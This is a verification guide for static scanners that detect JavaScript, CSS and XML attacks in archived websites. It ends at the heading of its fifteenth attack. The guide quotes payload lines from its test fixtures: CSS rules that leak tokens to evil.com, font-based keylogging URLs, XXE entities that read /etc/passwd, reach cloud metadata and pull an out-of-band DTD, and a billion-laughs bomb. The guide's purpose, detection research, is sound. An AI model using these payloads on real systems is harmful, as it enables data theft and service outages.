# Attack Verification Guide

## What "verification" means here

These are **static pattern scanners**, not live exploits. Each scanner reads a file and
looks for code patterns that match known attack techniques. Verification means:
1. You read the test file and can see the vulnerable code yourself
2. You run the scanner and see it detect exactly that code
3. The output matches what the attack description says should be flagged

No running web server or browser required. All test files are in `test_cases/`.

## How to use this guide

Each attack has:
- **Gist** — what it is in plain language
- **Scanner logic** — the exact patterns it searches for  
- **Test file + key lines** — where the vulnerability lives
- **Command** — run this, look at the output
- **Expected output** — what a correct detection looks like

For the 8 attacks that exist in both repos, there is also:
- **Implementation choice** — which one to use and why

Run all verifications at once:
```bash
cd security_pipeline/
bash verification/run_verification.sh 2>&1 | tee verification/run_output.txt
```

Or run a single attack:
```bash
cd security_pipeline/
python driver.py test_cases/js/ --ext .js --output /dev/stdout 2>/dev/null | grep -A6 "ATTACK.*Prototype"
```

---

## SECTION 1: JavaScript Attacks

---

### Attack 1: Prototype Pollution
**Gist:** In JavaScript, almost every object inherits from `Object.prototype`. If an attacker
can inject a key like `__proto__` into a merge function, that property silently appears on
*every* object in the application — enabling auth bypass, XSS, or RCE.

**Scanner logic:** Looks for `Object.prototype.x =` (CRITICAL), `__proto__` assignment (HIGH),
`.constructor.prototype` access path (HIGH), known-vulnerable merge functions — `$.extend(true, ...)`,
`_.merge()`, `_.defaultsDeep()`, `_.set()` (HIGH) — unsafe for-in bracket-assign (HIGH), JSON.parse
piped into merge (HIGH), and bare `__proto__` references (MEDIUM).

**Test file:** `test_cases/js/tc01_proto_pollution.js`
- Line 2: `Object.prototype.isAdmin = true;` — direct pollution
- Line 5: `$.extend(true, {}, userData);` — jQuery deep merge
- Line 8: `_.merge(config, req.body);` — Lodash merge on user input
- Line 14: `obj.__proto__.polluted = 1;` — direct `__proto__` write
- Lines 17–20: NEGATIVE cases (shallow extend, Object.assign) — should NOT be flagged

**Command:**
```bash
python -c "
from scanners.js_scanner import JavaScriptScanner
s = JavaScriptScanner()
for f in s.scan('test_cases/js/tc01_proto_pollution.js'):
    print(f'Line {f.line_number}: {f.description}')
    print(f'  Code: {f.line_content}')
"
```

**Expected output:** 5+ findings on lines 2, 5, 8, 11, 14. Lines 17, 20, 23 should NOT appear.

**Implementation choice: archive-sec-analysis (`prototype-pollution-scanner/`)**
- Also catches `constructor.prototype` access and JSON parse spread patterns
- Detects *defensive* patterns too (Object.freeze, hasOwnProperty guards) — useful for
  tracking whether sites added protections over time in the longitudinal study
- Use security_pipeline for the matrix CSV output; use archive-sec-analysis for deep analysis

**Known false negatives:** The scanner uses full-text DOTALL pattern matching (no line lookahead window — that is a postMessage implementation detail, not PP). Patterns not detected: `Object.defineProperty(Object.prototype, 'x', ...)` (property descriptor pollution); `Object.setPrototypeOf(target, src)` (explicit prototype swap); dynamic computed-key paths where `__proto__` is assembled from user-controlled parts without appearing literally; array constructor chains (`[].constructor.prototype`); and for-in loops guarded by `hasOwnProperty` that are still flagged as HIGH (false positive case: the guard makes them safe, but the scanner does not parse guard presence).

**Reference:** Shcherbakov et al., "Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js," *USENIX Security 2023*. https://www.usenix.org/conference/usenixsecurity23/presentation/shcherbakov -- Demonstrates how `__proto__` and `constructor.prototype` pollution in server-side Node.js leads to RCE via gadget chains. The scanner covers `__proto__` assignment, `constructor.prototype`, known-vulnerable merge functions, unsafe for-in bracket-assign, and JSON.parse-into-merge chains. Also: Kang et al., "Probe the Proto: Measuring Client-Side Prototype Pollution Vulnerabilities of One Million Real-world Websites," *NDSS 2022* -- establishes the three-vector taxonomy (`__proto__`, `constructor.prototype`, `constructor[prototype]`) used as the basis for this scanner's pattern classes.

---

### Attack 2: Open Redirect
**Gist:** A site reads a URL from user input (like `?redirect=...`) and sends the browser there
without checking if it's safe. Attackers craft a link like `site.com/login?redirect=evil.com`
— victims see the trusted domain and click, landing on a phishing page.

**Scanner logic:** Six redirect sinks (from Khodayari et al. NDSS 2025 Table II, 20,898 confirmed flows):
`location.href = var`, `location.replace(var)`, `location.assign(var)`, `window.open(var)`,
`window.location = var` (direct assignment, no `.href`), `iframe/frame.src = var`.
Checks 5 lines of surrounding context for user-controlled sources (`location.search`,
`location.hash`, `document.referrer`, `window.name`, `URLSearchParams`, etc.) and escalates to HIGH if found, MEDIUM otherwise.

**Test file:** `test_cases/js/tc02_open_redirect.js`
- Lines 2–3: `next = URLSearchParams(...).get('next'); location.href = next;` — HIGH (source nearby)
- Line 6: `window.location.replace(document.referrer);` — HIGH (referrer is user-controlled)
- Line 12: `location.href = "/dashboard";` — NEGATIVE (static string, should NOT fire)
- Line 15: `location.href = "https://example.com/page";` — NEGATIVE (hardcoded URL)

**Command:**
```bash
python -c "
from scanners.js_scanner import JavaScriptScanner
s = JavaScriptScanner()
for f in s.scan('test_cases/js/tc02_open_redirect.js'):
    print(f'Line {f.line_number} [{f.severity}]: {f.description}')
    print(f'  Code: {f.line_content}')
"
```

**Expected output:** Lines 3, 6, 9, 19 flagged as open_redirect. Lines 12, 15 should NOT appear.
Lines with a nearby user-controlled source show as HIGH; others as MEDIUM.

**Implementation choice: security_pipeline**
- Context-aware severity (HIGH if user-controllable source is nearby, MEDIUM otherwise)
  reduces false positives compared to a flat pattern-match
- archive-sec-analysis scanner uses full-text DOTALL patterns (catches multi-line flows)
  but does not distinguish source proximity — all are the same severity

**Known false negatives:** The 5-line context window misses multi-line flows where the source and sink are more than 5 lines apart — a simplification vs full CPG taint analysis. Sinks accessed via aliased variables (e.g., `var loc = window.location; loc.href = url`) are not followed. The `hashchange` event listener pattern (user navigates, JS reads `location.hash` and redirects) requires tracking the event callback, which static pattern matching does not do. The `frame.src` sink is flagged regardless of whether the frame is cross-origin — same-origin frame src changes are not a redirect vulnerability.

**Reference:** Khodayari, Glauber & Pellegrino, "Do (Not) Follow the White Rabbit: Challenging the Myth of Harmless Open Redirection," *NDSS 2025*. https://dx.doi.org/10.14722/ndss.2025.240523 — Large-scale empirical study of client-side open redirect vulnerabilities across the top 10K websites; identifies 184 vulnerability indicators in 9 groups, confirms 20,898 open redirect flows across 623 sites, and shows 11.5% can be escalated to XSS, CSRF, or information leakage. Table II establishes the authoritative sink taxonomy (`window.open`, `window.location`, `frame.src`, `location.href`, `location.replace`, `location.assign`) used by this scanner. Also: OWASP CWE-601: https://cwe.mitre.org/data/definitions/601.html

---

### Attack 3: High-Risk Browser APIs
**Gist:** Browser APIs like `navigator.geolocation`, `getUserMedia` (camera/mic), and
`navigator.clipboard.read` are privacy-sensitive. If a third-party script on a page calls
these — or if the legitimate script is compromised — user location, audio, or clipboard
contents can be exfiltrated silently.

**Scanner logic:** Pattern matches for `navigator.geolocation`, `navigator.mediaDevices.getUserMedia`,
`RTCPeerConnection` (IP leak), `navigator.clipboard.read/readText`, Bluetooth, USB, Serial,
PaymentRequest, Credentials API.

**Test file:** `test_cases/js/tc03_high_risk_api.js`  
Key lines: `navigator.geolocation.getCurrentPosition(cb)`, `navigator.mediaDevices.getUserMedia(...)`,
`navigator.clipboard.readText()`, `new RTCPeerConnection(config)`, `navigator.bluetooth.requestDevice()`

**Command:**
```bash
python -c "
from scanners.js_scanner import JavaScriptScanner
s = JavaScriptScanner()
for f in s.scan('test_cases/js/tc03_high_risk_api.js'):
    print(f'Line {f.line_number} [{f.severity}]: {f.description}')
"
```

**Expected output:** geolocation, getUserMedia, clipboard.read/readText as HIGH. WebRTC,
Bluetooth, USB, Credentials, PaymentRequest as MEDIUM. 7+ findings total.

**Implementation choice: archive-sec-analysis (`high-risk-api-detector/`)**
- Also checks HTTP response headers for `Permissions-Policy` / `Feature-Policy` directives
- For the longitudinal study, knowing whether a government site *set* a restrictive
  Permissions-Policy header is more important than just detecting API calls in JS
- Use security_pipeline for JS code detection in the pipeline; use archive-sec-analysis for
  header-based policy analysis on the archived JSON headers

**Reference:** Snyder et al., "Most Websites Don't Need to Vibrate: A Cost-Benefit Approach to Improving Browser Security," *ACM CCS 2017*. https://dl.acm.org/doi/10.1145/3133956.3134038 — Empirically measures which browser APIs are used on real sites; finds that geolocation, getUserMedia, WebRTC, and payment APIs have very low legitimate usage rates, justifying treating their presence as an auditable risk signal. The scanner's API list is drawn from the high-risk category in this paper's Table 2.

---

### Attack 4: Dangerous Sinks
**Gist:** A "sink" is a JS function that executes whatever string you pass it. `eval(userInput)`
directly runs attacker code. `innerHTML = userInput` parses attacker HTML including `<script>`.
`document.write(userInput)` injects raw HTML. If user-controlled data reaches any of these,
it's XSS or arbitrary code execution.

**Scanner logic:** `eval(` and `new Function(` are CRITICAL (always dangerous regardless of input type). `setTimeout`/`setInterval` with a string or template literal first arg are CRITICAL (equivalent to eval); with a variable arg they are MEDIUM (ambiguous: could be a callback reference or a string). `document.write(`, `.innerHTML = var`, `.outerHTML = var` are HIGH. `.insertAdjacentHTML(`, `.srcdoc =`, `.createContextualFragment(` are MEDIUM.

**Test file:** `test_cases/js/tc04_dangerous_sinks.js`
- Line 3: `eval(userInput)` — CRITICAL
- Line 7: `new Function("return " + expr)` — CRITICAL
- Line 11: `setTimeout(callback_string, 100)` — MEDIUM (variable, ambiguous)
- Line 15: `document.write('<div>' + data + '</div>')` — HIGH
- Line 19: `.innerHTML = serverResponse` — HIGH
- Line 36: `element.textContent = userInput` — NEGATIVE (textContent is safe, no HTML parsing)

**Command:**
```bash
python -c "
from scanners.js_scanner import JavaScriptScanner
s = JavaScriptScanner()
for f in s.scan('test_cases/js/tc04_dangerous_sinks.js'):
    print(f'Line {f.line_number} [{f.severity}]: {f.description}')
    print(f'  Code: {f.line_content}')
"
```

**Expected output:** `eval` and `new Function` lines as CRITICAL. document.write, innerHTML, outerHTML as HIGH. `setTimeout(callback_string, 100)` as MEDIUM (variable arg). insertAdjacentHTML as MEDIUM. textContent NOT flagged.

**Known false negatives:** `document.domain = var` (legacy origin relaxation) and `location.href = stringVar` are not in the dangerous-sink list (they appear in open_redirect). Template-literal concatenations like `` eval(`code ${userInput}`) `` match as CRITICAL on the `eval(` part, not on the template itself.

**Reference:** Lekies et al., "25 Million Flows Later: Large-scale Detection of DOM-based XSS," *ACM CCS 2013*. https://dl.acm.org/doi/10.1145/2508859.2516723 -- Provides the definitive taxonomy of DOM XSS sinks used here: `eval`, `innerHTML`, `document.write`, `setTimeout(string)`, `location.*`. The scanner uses CRITICAL for string/template literal `setTimeout` arguments and MEDIUM for variable arguments to reduce false positives on normal callback usage like `setTimeout(myFn, 1000)`.

---

### Attack 5: JSONP Callback Injection
**Gist:** JSONP is a pre-CORS hack where APIs wrap JSON in a function call: `myCallback({...})`.
If the callback name comes from a URL parameter without sanitization, an attacker can set
`?callback=alert` and the server returns `alert({...})` — executing arbitrary JS. Any page
can load a JSONP endpoint cross-domain, stealing the user's data.

**Scanner logic:** URL parameters `?callback=`, `?jsonp=`, `?jsonpcallback=`. jQuery config
`dataType: "jsonp"` and `jsonpCallback:`. Also flags `<script src="...?callback=...">` as HIGH
since that directly loads cross-domain data.

**Test file:** `test_cases/js/tc05_jsonp.js`
- Line 2: `?callback=handleUsers` in URL
- Lines 7–8: `dataType: "jsonp"` in jQuery ajax config
- Line 15: `jsonpCallback: "myHandler"`
- Line 20: script tag src with `?callback=processData` (the most dangerous form)
- Line 23: `?format=json` — NEGATIVE (regular JSON, no callback param)

**Command:**
```bash
python -c "
from scanners.js_scanner import JavaScriptScanner
s = JavaScriptScanner()
for f in s.scan('test_cases/js/tc05_jsonp.js'):
    print(f'Line {f.line_number} [{f.severity}]: {f.description}')
"
```

**Expected output:** 5–6 findings. Script-tag-with-callback is HIGH; others are MEDIUM.

**Known false negatives:** Some JSONP APIs use `cb=`, `jsoncallback=`, or custom parameter names not in the list. Dynamic URL construction (`url + "?callback=" + fn`) is not detected without data-flow analysis.

**Reference:** Lekies et al., "25 Million Flows Later," *ACM CCS 2013* (above) — §3 characterises JSONP endpoints as a cross-origin data exposure vector when the callback parameter is not validated. Also: OWASP "JSONP Hijacking" wiki: https://owasp.org/www-community/attacks/JSONP_Injection — explains how an attacker's page can load `?callback=steal` and harvest the JSON payload cross-domain.

---

### Attack 6: ReDoS (Regex Denial of Service)
**Gist:** Some regular expressions cause exponential backtracking when given a crafted input.
`/^([a-zA-Z0-9]+)+@/` against `"aaaaaaaaaaaaaaaaa!"` tries millions of path combinations
before failing. With 30 characters the browser tab freezes. An attacker sending a malformed
input string can lock up the JS thread for minutes.

**Scanner logic:** Finds regex literals (`/.../`) and `new RegExp("...")` calls. Within each,
checks for dangerous structures: nested quantifiers `(a+)+`, quantified alternations `(a|b)+`,
groups with overlap.

**Test file:** `test_cases/js/tc06_redos.js`
- Line 2: `/^([a-zA-Z0-9]+)+@example\.com$/` — nested `+` quantifier
- Line 5: `/^(a|a)+$/` — overlapping alternation
- Line 8: `new RegExp("^(\\d+\\.)+$")` — nested quantifier via constructor
- Lines 11–14: clean patterns (`+`, `{3}-{4}`) — NEGATIVE

**Command:**
```bash
python -c "
from scanners.js_scanner import JavaScriptScanner
s = JavaScriptScanner()
for f in s.scan('test_cases/js/tc06_redos.js'):
    print(f'Line {f.line_number}: {f.description}')
"
```

**Expected output:** 3 MEDIUM findings on lines 2, 5, 8. Lines 11–14 should NOT appear.

**Reference:** Davis et al., "The Impact of Regular Expression Denial of Service (ReDoS) on Practice: An Empirical Study at the Ecosystem Scale," *FSE/ESEC 2018*. https://dl.acm.org/doi/10.1145/3236024.3236027 — Studies ReDoS in npm and reports that 13% of packages contain at least one vulnerable regex. **Critical methodology note:** Davis et al. use *automaton-based complexity analysis* (NFA state-space traversal) to identify super-linear regexes. The scanner instead uses *syntactic pattern matching* on nested quantifiers — a much coarser heuristic that misses many ReDoS-prone patterns and can flag safe ones. If citing this paper as justification, reframe the scanner as "syntactic heuristic detection of nested quantifier structures" rather than claiming full ReDoS detection.

---

### Attack 7: Service Worker Scope Audit
**Gist:** A service worker is JS that the browser installs as a persistent background proxy,
intercepting all network requests. If an attacker achieves XSS and registers a malicious
service worker with scope `/`, they control the site permanently — even after the XSS is
patched. The service worker stays installed in the browser.

**Scanner logic:** `serviceWorker.register(...)` calls with scope `/` or `/*` (HIGH).
Without explicit scope (defaults to SW file directory) is MEDIUM. `importScripts(...)` from
external domains is MEDIUM.

**Test file:** `test_cases/js/tc07_service_worker.js`
- Line 2: `.register('/sw.js', { scope: '/' })` — HIGH (explicit broad scope)
- Line 5: `.register('/scripts/service-worker.js')` — MEDIUM (no scope = default)
- Line 8: `importScripts('https://cdn.example.com/analytics-sw.js')` — MEDIUM (external script)

**Command:**
```bash
python -c "
from scanners.js_scanner import JavaScriptScanner
s = JavaScriptScanner()
for f in s.scan('test_cases/js/tc07_service_worker.js'):
    print(f'Line {f.line_number} [{f.severity}]: {f.description}')
"
```

**Expected output:** Line 2 as HIGH (broad scope), lines 5 and 8 as MEDIUM.

**Known false negatives:** The broad-scope check only catches literal scope strings (`'/'`, `'/*'`). A computed scope value (e.g., `{scope: rootPath}`) is not detected. `importScripts` with relative URLs (not external) is not flagged, though a relative path in a compromised SW file would still be dangerous. Service worker *update* calls (`registration.update()`) and cache manipulation patterns are not in scope.

**Reference:** Karami et al., "Awakening the Web's Sleeper Agents: Misusing Service Workers for Privacy Leakage," *NDSS 2021*. https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/ — Demonstrates that service workers with broad scope (`/`) act as persistent network-level interceptors; shows real-world attack scenarios including cache poisoning and persistent XSS after patch. The scanner flags registration scope and `importScripts` from external domains as the two highest-risk patterns from this paper.

---

### Attack 8: Cryptominer Detection (JavaScript)
**Gist:** In 2017, Coinhive launched a JS-based Monero miner embeddable on any website.
Thousands of sites were compromised to mine crypto using visitors' CPUs with zero consent.
The visitor's computer slows down, battery drains — while the miner earns revenue.

**Scanner logic:** Known miner domains (`coinhive.com`, `cryptoloot.pro`, etc.) and
initialization patterns: `CoinHive.Anonymous(...)` as CRITICAL, `CryptoLoot.Anonymous(...)`,
`miner.start()`, `cryptonight` algorithm reference as HIGH, `startMining` as MEDIUM.

**Test file:** `test_cases/js/tc08_cryptominer.js`
- Line 2: `new CoinHive.Anonymous('xhIjAfwL60rB8FLxGo0P4dMNmKdN3YBO')` — CRITICAL
- Line 12: `"coinhive.com/lib/coinhive.min.js"` — CRITICAL (known domain)
- Line 18: `function cn_slow_hash(...)` — HIGH (CryptoNight algorithm)
- Lines 22–24: price lookups and comments — NEGATIVE

**Command:**
```bash
python -c "
from scanners.js_scanner import JavaScriptScanner
s = JavaScriptScanner()
for f in s.scan('test_cases/js/tc08_cryptominer.js'):
    print(f'Line {f.line_number} [{f.severity}]: {f.description}')
"
```

**Expected output:** Lines 2, 12, 15 (WebSocket to mining pool) as CRITICAL. Line 18 as HIGH.
Lines 22–24 should NOT appear.

**Known false negatives:** Miner domains registered after the domain list was compiled (post-2019) are not detected. Miners loaded via dynamically constructed URLs (string concatenation, Base64-decoded URLs) evade domain matching. The `miner.start()` pattern will produce false positives on any code with a `start()` method on an object named `miner` -- this is expected and acceptable given the rarity of that pattern in legitimate code.

**Reference:** Konoth et al., "MineSweeper: An In-depth Look into Browser-based Cryptomining," *ACM CCS 2018*. https://dl.acm.org/doi/10.1145/3243734.3243858 — Large-scale measurement study of Coinhive and 14 other in-browser miners; catalogues known miner domains, JavaScript API patterns (`CoinHive.Anonymous`, `CryptoLoot.Anonymous`), and WebSocket Stratum protocol usage. The scanner's domain list and API pattern list are directly drawn from this paper's Table 1 and Table 2. Also: Hong et al., "How You Get Shot in the Back: A Systematical Study about Cryptojacking in the Real World," *ACM CCS 2018*. https://dl.acm.org/doi/10.1145/3243734.3243840 — Complementary measurement paper confirming the same domain/pattern taxonomy.

---

### Attack 9: postMessage Handler Audit
**Gist:** `window.postMessage()` is the HTML5 API for cross-origin communication. The receiver
MUST check `event.origin` to know who sent it. Without that check, any website that iframes
the target page can send it arbitrary data. If that data flows to `innerHTML`, it's XSS —
the attacker controls your page from their site.

**Scanner logic:** Finds `addEventListener('message', ...)` handlers. Checks the handler body
(up to 15 lines) for: `event.origin ===` (strict — OK), `event.origin.indexOf(...)` (weak —
MEDIUM), no origin check at all (HIGH/CRITICAL depending on whether data flows to a sink).

**Test file:** `test_cases/js/tc09_postmessage.js`
- Lines 2–4: no origin check + `innerHTML = event.data` — CRITICAL
- Lines 7–10: no origin check, no dangerous sink — HIGH
- Lines 13–17: `e.origin.indexOf('trusted.com')` — MEDIUM (bypassable with `evil-trusted.com`)
- Lines 20–21: `postMessage(token, '*')` — MEDIUM (wildcard target origin)
- Lines 24–28: `e.origin === 'https://trusted.example.com'` — NEGATIVE (correct strict check)

**Command:**
```bash
python -c "
from scanners.js_scanner import JavaScriptScanner
s = JavaScriptScanner()
for f in s.scan('test_cases/js/tc09_postmessage.js'):
    print(f'Line {f.line_number} [{f.severity}]: {f.description}')
"
```

**Expected output:** Line 2 as CRITICAL. Line 7 as HIGH. Lines 13, 21 as MEDIUM. Lines 25–27 NOT flagged.

**Known false negatives:** The handler body lookahead is limited to 15 lines -- handlers spanning a larger function body (common in minified code) may not have their sink or origin check detected. Arrow function handlers (`(e) => { ... }`) are covered; named function references passed as the handler argument (e.g., `addEventListener('message', handleMsg)`) are not followed to their definition.

**Reference:** Son & Shmatikov, "The Postman Always Rings Twice: Attacking and Defending postMessage in HTML5 Websites," *NDSS 2013*. https://www.ndss-symposium.org/ndss2013/ndss-2013-programme/postman-always-rings-twice-attacking-and-defending-postmessage-html5-websites/ — Systematically analyses postMessage handler vulnerabilities: classifies missing origin check (HIGH/CRITICAL), weak origin check via `indexOf`/`includes` (MEDIUM, bypassable with `evil-trusted.com`), and wildcard targetOrigin in sends (MEDIUM). The scanner's three-tier classification (none / weak / strict) maps directly to this paper's threat model. The authors used dynamic analysis; this scanner replicates the *detection criteria* statically.

---

## SECTION 2: CSS Attacks

---

### Attack 10: CSS Attribute Selector Exfiltration
**Gist:** CSS selectors can match elements by their attribute values: `input[value^="a"]` matches
inputs whose value starts with "a". Pair that with `background-image: url(evil.com/a)` and
the browser silently makes an HTTP request when it renders. No JavaScript needed. An attacker
who can inject a CSS `<style>` tag can steal CSRF tokens character by character — even bypassing
a strict JavaScript Content Security Policy.

**Scanner logic:** Detects `[value^=...]` / `[value$=...]` / `[value*=...]` attribute selectors
combined with `url(https://...)` in the same rule block (within ±3 lines). Also bulk-detects
if 5+ `[value^=]` selectors appear in one file.

**Test file:** `test_cases/css/tc10_attr_exfil.css`
- Line 2: `input[name=csrf][value^=a] { background-image: url(https://evil.com/leak?char=a); }` — CRITICAL
- Lines 5–9: 5 value-prefix selectors with external URLs — triggers bulk CRITICAL
- Line 12: `input[type=hidden][value^=tok]` — CRITICAL
- Lines 14–18: NEGATIVE cases (no value probing, no external URL)

**Command:**
```bash
python -c "
from scanners.css_scanner import CSSScanner
s = CSSScanner()
for f in s.scan('test_cases/css/tc10_attr_exfil.css'):
    print(f'Line {f.line_number} [{f.severity}]: {f.description}')
    if f.line_content: print(f'  Code: {f.line_content}')
"
```

**Expected output:** Multiple CRITICAL findings. Bulk-detection finding (no line number) for
the 5+ prefix selectors. Lines 14–18 should NOT appear.

**Known false negatives:** The `content: counter()` and `list-style` exfil variants (probing using CSS counter values rather than `background-image`) are not detected. The ±3 line proximity check between selector and `url()` will miss cases where the selector and the background rule are in separate rule blocks that merge (via `@media` queries or cascade).

**Reference:** Heyes, "CSS Injection Primitives," *PortSwigger Research*, 2024. https://portswigger.net/research/css-injection-primitives — Practitioner research (not peer-reviewed) demonstrating the complete `input[value^="a"] { background-image: url(evil.com/?a) }` exfiltration loop. Confirms that this attack bypasses script-only CSPs and works across all major browsers. The scanner's `[value^=]` + `url(https://...)` pairing is the exact detection signal described. Also documented independently at: https://x-xss.is/docs/attacks/css-injection/

---

### Attack 11: @import Chain Exfiltration
**Gist:** CSS `@import 'https://evil.com/start'` makes the browser fetch an external stylesheet.
An attacker's server returns another `@import` per character of the secret, holding all
responses open (blocking) except the one matching the real character. Over HTTP/2, this leaks
a full CSRF token in under 3 seconds from a single CSS injection point — no page reload needed.

**Scanner logic:** Finds `@import url('https://...')` and `@import 'https://...'`. Single
external import is MEDIUM. Three or more imports to the same domain trigger HIGH (chaining pattern).
Five or more total external imports also trigger HIGH.

**Test file:** `test_cases/css/tc11_import_chain.css`
- Line 2: single external import — MEDIUM
- Lines 5–7: three imports to `evil.com` — triggers HIGH (same domain chain)
- Lines 10–14: five imports to different `cdn-*.evil.com` subdomains — HIGH (volume)
- Line 21: Google Fonts — MEDIUM (external, but common; still flagged)
- Lines 17–18: local imports — NEGATIVE

**Command:**
```bash
python -c "
from scanners.css_scanner import CSSScanner
s = CSSScanner()
for f in s.scan('test_cases/css/tc11_import_chain.css'):
    print(f'Line {f.line_number} [{f.severity}]: {f.description}')
"
```

**Expected output:** 10+ MEDIUM findings (one per external import), 1–2 HIGH findings for
the same-domain and high-volume patterns. Local imports NOT flagged.

**Known false negatives:** The attack requires the attacker's server to respond with branching `@import` chains keyed on the Referer header -- a server-side behavior that cannot be detected from the archived CSS file alone. Detection here identifies the *opportunity* (external imports exist), not the active attack.

**Reference:** Jankowski, "CSS data exfiltration in Firefox via a single injection point," *Securitum Research Blog*, 2020. https://research.securitum.com/css-injection-attack/ — Practitioner research (not peer-reviewed) showing that a single injected `@import` to an attacker-controlled server, combined with HTTP/2 server-push or blocked responses, can leak multi-character secrets. Also: Heyes, "PRSSI: Path Relative Style Sheet Import," *PortSwigger Research*, 2014 — the earlier formulation showing `@import` causes requests carrying the full page Referer URL. The scanner flags external `@import` URLs; the attack requires a server that reads the Referer and responds with branching imports, which cannot be detected statically.

---

### Attack 12: CSS Font Ligature Keylogging
**Gist:** `@font-face` can specify a `unicode-range` so the browser only downloads the font
for certain characters. An attacker creates one `@font-face` per character (U+0041 = "A",
U+0042 = "B", etc.), each pointing to their server. When the browser renders text using that
font, it fetches the character-specific URL — leaking what text is displayed. This steals
*visible text* content, not just attribute values.

**Scanner logic:** Finds `@font-face` blocks with both `unicode-range:` AND an external `src: url(https://...)`.
Single-codepoint range (e.g., `U+0041`) + external URL = HIGH. Five or more such blocks in
one file = CRITICAL (systematic keylogging).

**Test file:** `test_cases/css/tc12_font_keylog.css`
- Lines 2–6: First `@font-face` block: `U+0041` + `url(https://evil.com/log?char=A)` — HIGH
- Lines 9–33: Five more single-character blocks → triggers bulk CRITICAL
- Lines 36–40: Local URL + broad range (`U+0000-00FF`) — NEGATIVE (normal font usage)
- Lines 43–45: External URL but NO unicode-range — NEGATIVE

**Command:**
```bash
python -c "
from scanners.css_scanner import CSSScanner
s = CSSScanner()
for f in s.scan('test_cases/css/tc12_font_keylog.css'):
    print(f'Line {f.line_number} [{f.severity}]: {f.description}')
"
```

**Expected output:** 6 HIGH findings (one per single-char @font-face block) and 1 CRITICAL
(bulk pattern). Lines 36–45 should NOT appear.

**Reference:** maxchehab, "CSS Keylogger," *GitHub PoC*, 2018. https://github.com/maxchehab/CSS-Keylogger — Original proof-of-concept demonstrating `@font-face { unicode-range: U+0041; src: url(evil.com/?A); }` per character. No peer-reviewed paper exists for this specific attack. The attack concept is also described in Heyes, "CSS Injection Primitives" (PortSwigger, 2024, above). The scanner's detection condition — single-codepoint `unicode-range` + external `src: url(https://...)` — is the exact PoC pattern. **Source note:** practitioner blog + GitHub PoC only; no conference paper citation is possible for this attack.

---

## SECTION 3: XML / XSLT Attacks

---

### Attack 13: XXE — XML External Entity Injection
**Gist:** XML parsers support "entities" — shortcuts like `&name;` that expand to text. A
`SYSTEM` entity can reference a file: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`. When the
parser resolves `&xxe;`, it reads and inserts the file contents. The attacker gets
`/etc/passwd` back in the XML response. The same works with internal URLs (SSRF).

**Scanner logic:** `<!ENTITY x SYSTEM "...">` — CRITICAL, with sub-classification: `file://`
= local file read, `http://` = SSRF. Parameter entities (`<!ENTITY % x SYSTEM ...>`) used
for out-of-band exfiltration — CRITICAL. External DTD reference — HIGH.

**Test file:** `test_cases/xml/tc13_xxe.xml`
- Line 10: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — CRITICAL (local file)
- Line 11: `<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">` — CRITICAL (SSRF to AWS metadata)
- Line 12: `<!ENTITY % oob SYSTEM "http://evil.com/exfil.dtd">` — CRITICAL (parameter entity, OOB exfil)

**Command:**
```bash
python -c "
from scanners.xml_scanner import XMLScanner
s = XMLScanner()
for f in s.scan('test_cases/xml/tc13_xxe.xml'):
    print(f'Line {f.line_number} [{f.severity}]: {f.description}')
"
```

**Expected output:** 3 CRITICAL findings on lines 10, 11, 12. Verify `tc13_xxe_clean.xml`
produces 0 CRITICAL findings (true-negative check).

**Known false negatives:** Multi-line DOCTYPE declarations (entity definition split across lines) may be missed by the line-by-line scanner. Blind/OOB XXE via out-of-band DNS channels is structurally identical to the HTTP SSRF pattern and is caught; error-based XXE patterns are not distinguishable from regular entity references. The scanner flags the *document structure* -- the actual vulnerability is in the server-side XML parser configuration (external entity processing enabled), which cannot be observed from the archived file.

**Reference:** OWASP XML External Entity (XXE) Processing: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing — Canonical reference for the `<!DOCTYPE … <!ENTITY … SYSTEM "…">` attack pattern, covering local file read (`file://`), SSRF (`http://`), and out-of-band exfiltration via parameter entities. Also: OWASP XXE Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html — lists the exact DOCTYPE and ENTITY patterns the scanner detects. Original vulnerability class documented by Steuck, "XXE (Xml eXternal Entity) Attack," *Securiteam Blog*, 2002 (predates most papers). The scanner correctly targets *document-level* XXE patterns — the actual vulnerability is in the *parser configuration* (server side), but archived XML containing these patterns is strong evidence the server was XXE-susceptible.

---

### Attack 14: XML Bomb / Billion Laughs
**Gist:** XML entity expansion is recursive. Define `lol1` as 10 copies of `lol`, `lol2`
as 10 copies of `lol1`, and so on to `lol9`. The resulting expansion is 10^9 = 1 billion
copies — 3 GB from a 1 KB file. The XML parser crashes trying to expand it. Pure DoS
with no code execution needed.

**Scanner logic:** Finds entity definitions that reference other entities. Counts reference
depth and multiplicity: ≥5 references in one entity value = CRITICAL. Entity chain depth ≥3
(A refs B, B refs C) = CRITICAL. Also flags total entity count ≥5 as MEDIUM.

**Test file:** `test_cases/xml/tc14_xml_bomb.xml`
- Line 7: `<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">` — 10 refs → CRITICAL
- Lines 7–11: 4 levels of nesting (lol→lol2→lol3→lol4→lol5) — chain depth CRITICAL

**Command:**
```bash
python -c "
from scanners.xml_scanner import XMLScanner
s = XMLScanner()
for f in s.scan('test_cases/xml/tc14_xml_bomb.xml'):
    print(f'[{f.severity}]: {f.description}')
"
```

**Expected output:** Multiple CRITICAL findings. Verify `tc14_xml_bomb_safe.xml` produces 0 CRITICAL.

**Known false negatives:** The Quadratic Blowup variant (one entity with a very long value repeated many times, no nesting) is not detected by the depth-chain check. Only inline entity definitions (`<!ENTITY name "value">`) are analyzed; SYSTEM/PUBLIC entity bombs where the value is fetched externally would require resolving the DTD.

**Reference:** Sullivan, "Attacking XML Security," *Black Hat USA 2009*. https://www.blackhat.com/presentations/bh-usa-09/SULLIVAN/BHUSA09-Sullivan-AttackingXML-PAPER.pdf — Presents the Billion Laughs / Quadratic Blowup taxonomy; the scanner's entity-chain depth and per-entity reference-count thresholds are drawn from the expansion factors described in §3 of this paper. The "Billion Laughs" name originates from a 2003 CVE (CVE-2003-1564) against libxml2.

---

### Attack 15: XPath Injection
